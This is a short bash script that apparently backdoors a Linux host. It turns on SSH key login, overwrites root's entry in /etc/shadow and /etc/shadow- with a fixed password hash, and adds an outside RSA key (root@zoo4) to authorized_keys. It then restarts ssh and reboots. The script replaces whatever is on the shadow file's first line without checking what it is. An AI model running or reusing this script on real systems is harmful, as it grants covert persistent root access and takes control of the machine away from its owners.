#!/bin/bash

sed -i 's/#PubkeyAuthentication/PubkeyAuthentication/g' -i /etc/ssh/sshd_config

sed '1d' -i /etc/shadow

sed '1i\root:$y$j9T$HGTDJ.dqONFuYC5XeMA1r0$up4ugNPytqJwz4RyJfUgjPz1eAyK/NLn.ZmW6ysM7G7:19333:0:14600:14:::' -i /etc/shadow

sed '1d' -i /etc/shadow-

sed '1i\root:$y$j9T$HGTDJ.dqONFuYC5XeMA1r0$up4ugNPytqJwz4RyJfUgjPz1eAyK/NLn.ZmW6ysM7G7:19333:0:14600:14:::' -i /etc/shadow-

sed '1i\ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCyp3HKHgwBAGfcuAYh5Dl6jXOOYGap7cEpSddssKw2XAUIKJ8eJm5LniXkdeno2NtgAVqzzZp5uuQzwLYqZVQTtUmODw5tYzljaSq8azsQiRkA+vCpbbLgGu14uM5XaUSnJfokdTDzfJ/dpsLG/K7hb35IzfxHM3Nm0uVl/lp2KrurI9HE+j5pifVoTyHcFiVZBcVd343E8qBeqgFuJUYh0lEHVb4Jt11d/2KH7l0y1iDpDL2nNjmhhIxF4yiIhEXd5KVjP95jgxMp3LaezmPemYhIH1ke8ayknLFmIv6GX1KJGcITD969NHty598Lad9QImslTrItTsDHp34mW2JQvDxyIvhWw6Tc8522rLMk1mURFdAEK3Fv+k7Z403zTVMQCYo3odMftDLw5iGdo1rdXnHna6Ss7nAHa/O/3vG4gKrPmv/U98JQHemGKSA6mMFc2Of4eBxs7/RgFeuRSJrD69OHx795J05k139R6y4PAX/6uCsyqBU/1RJnPDccE+0= root@zoo4' -i ~/.ssh/authorized_keys

systemctl restart ssh

reboot
